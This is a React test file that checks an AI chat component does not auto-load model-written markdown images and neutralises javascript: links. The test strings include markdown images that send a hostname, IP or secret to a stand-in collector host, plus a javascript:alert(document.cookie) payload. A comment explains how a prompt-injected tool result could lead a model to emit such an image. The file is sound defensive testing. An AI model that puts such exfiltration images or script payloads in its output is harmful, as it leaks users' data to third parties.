import { render } from '@testing-library/react';
import { describe, expect, it, vi } from 'vitest';

import AiChatMessages from './AiChatMessages';

// Unlike AiChatMessages.test.tsx (which mocks react-markdown away because it
// only cares about scroll-anchoring wiring), this file renders the REAL
// react-markdown pipeline — that pipeline, not the component tree around it,
// is what decides whether a model-authored markdown image auto-loads.
vi.mock('./AiToolCallCard', () => ({ default: () => null }));
vi.mock('./AiApprovalDialog', () => ({ default: () => null }));
vi.mock('./AiPlanReviewCard', () => ({ default: () => null }));
vi.mock('./AiPlanProgressBar', () => ({ default: () => null }));
vi.mock('./AiRunCard', () => ({ default: () => null }));

const baseProps = {
  pendingApproval: null,
  onApprove: vi.fn(),
  onReject: vi.fn(),
};

describe('AiChatMessages markdown image rendering', () => {
  it('does not render an <img> element for a model-authored markdown image (tool-result-shaped content)', () => {
    // Mirrors what a tool result carrying unfenced, instruction-like text
    // could cause the model to stream back: a markdown image whose URL
    // encodes other data as a query string.
    const content =
      'Here is a summary of the requested log data: ![](https://collector.example/x?d=hostname-and-ip-here)';

    const { container } = render(
      <AiChatMessages {...baseProps} messages={[{ id: '1', role: 'assistant', content }] as never} />,
    );

    expect(container.querySelector('img')).toBeNull();
  });

  it('renders the image as a click-through link with an http(s) href instead', () => {
    const content = '![beacon](https://collector.example/x?d=secret)';

    const { getByRole } = render(
      <AiChatMessages {...baseProps} messages={[{ id: '1', role: 'assistant', content }] as never} />,
    );

    const link = getByRole('link', { name: 'beacon' });
    expect(link).toHaveAttribute('href', 'https://collector.example/x?d=secret');
    expect(link).toHaveAttribute('target', '_blank');
  });

  it('drops a non-http(s) image source (javascript:, data:) without linking it', () => {
    const content = '![payload](javascript:alert(document.cookie))';

    const { container, queryByRole } = render(
      <AiChatMessages {...baseProps} messages={[{ id: '1', role: 'assistant', content }] as never} />,
    );

    expect(container.querySelector('img')).toBeNull();
    expect(queryByRole('link', { name: 'payload' })).toBeNull();
  });

  it('still renders a plain http(s) markdown link as a clickable anchor', () => {
    const content = '[click me](https://example.com/page)';

    const { getByRole } = render(
      <AiChatMessages {...baseProps} messages={[{ id: '1', role: 'assistant', content }] as never} />,
    );

    expect(getByRole('link', { name: 'click me' })).toHaveAttribute('href', 'https://example.com/page');
  });

  it('does not resolve a javascript: markdown link to an executable href', () => {
    const content = '[click me](javascript:alert(1))';

    const { getByRole } = render(
      <AiChatMessages {...baseProps} messages={[{ id: '1', role: 'assistant', content }] as never} />,
    );

    expect(getByRole('link', { name: 'click me' })).toHaveAttribute('href', '#');
  });
});
